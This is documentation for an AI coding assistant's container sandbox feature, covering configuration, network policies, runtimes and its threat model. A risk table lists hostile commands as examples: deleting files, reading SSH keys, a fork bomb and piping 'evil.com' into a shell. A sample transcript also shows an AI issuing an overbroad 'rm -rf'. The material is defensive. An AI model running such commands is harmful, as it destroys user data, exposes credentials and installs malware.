# Sandboxed Execution

> **Run AI-generated code safely. No more worrying about destructive commands.**

Wonopcode's sandboxing feature isolates all AI-generated code in containers, protecting your host system from potentially harmful operations. This is wonopcode's **key differentiator**—no other AI coding assistant offers native sandboxed execution.

---

## Why Sandboxing Matters

When you use an AI coding assistant, it generates and executes code on your behalf. Without sandboxing, this code runs directly on your system with your permissions:

| Risk | Example | Consequence |
|------|---------|-------------|
| **File Deletion** | `rm -rf ~/Documents` | Permanent data loss |
| **System Modification** | `sudo apt remove python` | Broken environment |
| **Credential Theft** | `cat ~/.ssh/id_rsa` | Security breach |
| **Resource Exhaustion** | `:(){ :\|:& };:` | System freeze |
| **Network Attack** | `curl evil.com \| sh` | Malware installation |

**With sandboxing, none of these affect your host system.**

---

## Quick Enable

Add one line to your configuration:

```json
{
  "sandbox": {
    "enabled": true
  }
}
```

That's it. All bash commands, file operations, and package installations now run in an isolated container.

---

## How It Works

```
┌─────────────────────────────────────────────────────────────┐
│                        Your Host System                      │
│                                                              │
│   ┌──────────────────────────────────────────────────────┐  │
│   │                      Wonopcode                        │  │
│   │                                                       │  │
│   │   "Install numpy and run my analysis script"          │  │
│   │                        │                              │  │
│   │                        ▼                              │  │
│   │   ┌────────────────────────────────────────────────┐ │  │
│   │   │              Sandbox Container                  │ │  │
│   │   │                                                 │ │  │
│   │   │  /workspace/  ◄── Your project (mounted)       │ │  │
│   │   │                                                 │ │  │
│   │   │  $ pip install numpy  ◄── Isolated              │ │  │
│   │   │  $ python script.py   ◄── Safe execution        │ │  │
│   │   │                                                 │ │  │
│   │   │  ✓ Can modify project files                    │ │  │
│   │   │  ✗ Cannot access ~/.ssh, ~/.aws                │ │  │
│   │   │  ✗ Cannot modify /usr, /etc                    │ │  │
│   │   │  ✗ Cannot run as root on host                  │ │  │
│   │   └────────────────────────────────────────────────┘ │  │
│   └──────────────────────────────────────────────────────┘  │
│                                                              │
│   ~/.ssh/           ◄── Protected                           │
│   ~/.aws/           ◄── Protected                           │
│   /etc/             ◄── Protected                           │
│   ~/other-projects/ ◄── Protected                           │
└─────────────────────────────────────────────────────────────┘
```

### What Happens

1. **Isolation**: A container is created for your session
2. **Mounting**: Your project directory is mounted at `/workspace`
3. **Execution**: All commands run inside the container
4. **Sync**: File changes sync back to your project
5. **Protection**: Everything else remains untouched

---

## What's Protected

| Threat | Without Sandbox | With Sandbox |
|--------|-----------------|--------------|
| Accidental file deletion | ❌ Files deleted permanently | ✅ Only project files at risk |
| System package modification | ❌ System altered | ✅ Changes isolated to container |
| Home directory access | ❌ Full access | ✅ Only project directory |
| Credential file access | ❌ Can read ~/.ssh, ~/.aws | ✅ Not mounted |
| Network exfiltration | ❌ Full network access | ✅ Configurable policy |
| Resource exhaustion | ❌ Can freeze system | ✅ CPU/memory limits |
| Fork bombs | ❌ Can crash system | ✅ PID limits |

### What's NOT Protected

The sandbox protects your host system, but your **project files are still accessible** to the AI. This is intentional—the AI needs to read and modify your code.

If you're concerned about specific files in your project:
- Use `.gitignore` patterns for sensitive files
- Configure read-only mode for exploration agents
- Review AI actions before approval

---

## Configuration

### Basic Configuration

```json
{
  "sandbox": {
    "enabled": true
  }
}
```

### Full Configuration

```json
{
  "sandbox": {
    "enabled": true,
    "runtime": "auto",
    "image": "wonopcode/sandbox:latest",
    "resources": {
      "memory": "2G",
      "cpus": 2.0,
      "pids": 256
    },
    "network": "limited",
    "mounts": {
      "workspace_writable": true,
      "persist_caches": true
    },
    "bypass_tools": ["todoread", "todowrite"],
    "keep_alive": true
  }
}
```

### Configuration Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `enabled` | boolean | `false` | Enable sandboxing |
| `runtime` | string | `"auto"` | Runtime: `"auto"`, `"docker"`, `"podman"`, `"lima"` |
| `image` | string | `"wonopcode/sandbox:latest"` | Container image |
| `resources.memory` | string | `"2G"` | Memory limit |
| `resources.cpus` | number | `2.0` | CPU limit |
| `resources.pids` | number | `256` | Process limit |
| `network` | string | `"limited"` | Network policy: `"limited"`, `"full"`, `"none"` |
| `mounts.workspace_writable` | boolean | `true` | Allow writing to project |
| `mounts.persist_caches` | boolean | `true` | Persist npm/pip caches |
| `bypass_tools` | array | `[]` | Tools that run on host |
| `keep_alive` | boolean | `true` | Keep container running |

---

## Network Policies

Control what network access the sandbox has:

| Policy | Ports Allowed | Use Case |
|--------|---------------|----------|
| `"none"` | None | Maximum security, offline work |
| `"limited"` | 80, 443 (HTTP/S) | Normal development |
| `"full"` | All | Package installation, API calls |

```json
{
  "sandbox": {
    "enabled": true,
    "network": "limited"
  }
}
```

---

## Per-Agent Configuration

Different agents can have different sandbox settings:

```json
{
  "sandbox": {
    "enabled": true
  },
  "agent": {
    "code": {
      "sandbox": {
        "network": "full",
        "resources": {
          "memory": "4G"
        }
      }
    },
    "explore": {
      "sandbox": {
        "mounts": {
          "workspace_writable": false
        }
      }
    },
    "trusted": {
      "sandbox": {
        "enabled": false
      }
    }
  }
}
```

### Use Cases

- **Code agent**: Full network for package installation
- **Explore agent**: Read-only for safe exploration
- **Trusted agent**: No sandbox for system tasks (use carefully)

---

## Supported Runtimes

### Docker (Recommended for Linux)

```bash
# Install
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER

# Verify
docker run hello-world
```

```json
{
  "sandbox": {
    "enabled": true,
    "runtime": "docker"
  }
}
```

### Podman (Rootless Alternative)

```bash
# Install (Ubuntu)
sudo apt install podman

# Verify
podman run hello-world
```

```json
{
  "sandbox": {
    "enabled": true,
    "runtime": "podman"
  }
}
```

### Lima (macOS Native)

Better performance than Docker Desktop on macOS:

```bash
# Install
brew install lima

# Start
limactl start
```

```json
{
  "sandbox": {
    "enabled": true,
    "runtime": "lima"
  }
}
```

### Auto-Detection

The `"auto"` runtime (default) detects available runtimes in this order:
1. Docker
2. Podman
3. Lima

---

## Container Image

The default image includes:

- **Alpine Linux** base (lightweight)
- **Shells**: bash, zsh
- **Languages**: Python 3, Node.js
- **Tools**: git, curl, wget, ripgrep, fd
- **Build tools**: gcc, make

### Custom Image

Use your own image with additional tools:

```json
{
  "sandbox": {
    "image": "myregistry/custom-sandbox:v1"
  }
}
```

### Image Variants

| Image | Size | Contents |
|-------|------|----------|
| `wonopcode/sandbox:minimal` | ~50MB | Alpine + bash + basic tools |
| `wonopcode/sandbox:python` | ~150MB | + Python + pip |
| `wonopcode/sandbox:node` | ~200MB | + Node.js + npm |
| `wonopcode/sandbox:full` | ~400MB | Python + Node + Rust + Go |
| `wonopcode/sandbox:latest` | ~150MB | Alias for python |

---

## Performance

### Overhead

| Operation | Direct | Sandboxed | Overhead |
|-----------|--------|-----------|----------|
| Simple command | 5ms | 50-100ms | +45-95ms |
| File read | 1ms | 10-30ms | +9-29ms |
| File write | 1ms | 10-30ms | +9-29ms |
| Package install | 10s | 10s | ~0 |

The overhead is per-operation, not per-character. For typical AI interactions (reading files, running builds), the overhead is negligible.

### Optimization Tips

1. **Keep container running**: Set `"keep_alive": true` (default)
2. **Persist caches**: Set `"persist_caches": true` (default)
3. **Use Lima on macOS**: Better I/O performance than Docker Desktop
4. **Increase resources**: More CPU/memory for faster builds

---

## TUI Integration

### Status Indicator

The footer shows sandbox status:

```
⬡ Sandbox (docker) │ claude-sonnet │ session-abc123
```

- **Green**: Running and ready
- **Yellow**: Starting up
- **Red**: Error or stopped

### Commands

```
/sandbox start   - Start sandbox
/sandbox stop    - Stop sandbox
/sandbox status  - Show detailed status
/sandbox shell   - Open interactive shell in sandbox
```

---

## Troubleshooting

### "Docker not available"

```
Error: sandbox runtime 'docker' is not available
```

**Solution**: Install Docker or switch runtime:

```json
{
  "sandbox": {
    "runtime": "podman"
  }
}
```

### "Permission denied"

```
Error: permission denied while connecting to Docker daemon
```

**Solution**: Add user to docker group:

```bash
sudo usermod -aG docker $USER
# Log out and back in
```

### "Container start timeout"

```
Error: container failed to start within 60s
```

**Solution**: Increase timeout or check Docker status:

```bash
docker info  # Verify Docker is running
```

### "Slow file operations"

File I/O is slower on macOS Docker Desktop.

**Solution**: Use Lima instead:

```bash
brew install lima
limactl start
```

```json
{
  "sandbox": {
    "runtime": "lima"
  }
}
```

### "Package not found in sandbox"

The sandbox has minimal packages by default.

**Solution**: Install in session or use custom image:

```bash
# In wonopcode, ask AI to install
"Install pandas and run my script"

# Or use custom image with pre-installed packages
```

---

## Security Considerations

### Threat Model

The sandbox protects against:
- ✅ Accidental destructive commands
- ✅ Malicious code in dependencies
- ✅ AI hallucinating dangerous commands
- ✅ Resource exhaustion attacks

The sandbox does NOT protect against:
- ❌ AI modifying/deleting your project files (intentional)
- ❌ Exfiltration via network (if network enabled)
- ❌ Container escape vulnerabilities (rare, keep Docker updated)

### Best Practices

1. **Enable sandboxing** for all untrusted operations
2. **Use `"network": "limited"`** unless you need full network
3. **Use read-only mode** for exploration agents
4. **Set resource limits** to prevent DoS
5. **Review sensitive operations** before approval
6. **Keep Docker/Podman updated** for security patches

---

## Comparison: With vs Without Sandbox

### Without Sandbox

```
You: "Clean up old build files"
AI: rm -rf ./build ../other-project/build ~/Downloads/*.zip
    ─────────────────────────────────────────────────────
    ⚠️  Could delete unrelated files if AI makes a mistake
```

### With Sandbox

```
You: "Clean up old build files"
AI: rm -rf ./build ../other-project/build ~/Downloads/*.zip
    ─────────────────────────────────────────────────────
    ✅ Only ./build is deleted (it's in /workspace)
    ✅ ../other-project/ doesn't exist in sandbox
    ✅ ~/Downloads/ doesn't exist in sandbox
```

---

## Next Steps

- [Configuration](./CONFIGURATION.md) - Full configuration reference
- [Tools Overview](./guides/tools-overview.md) - How tools use the sandbox
- [Security Model](./architecture/security-model.md) - Deep dive on security
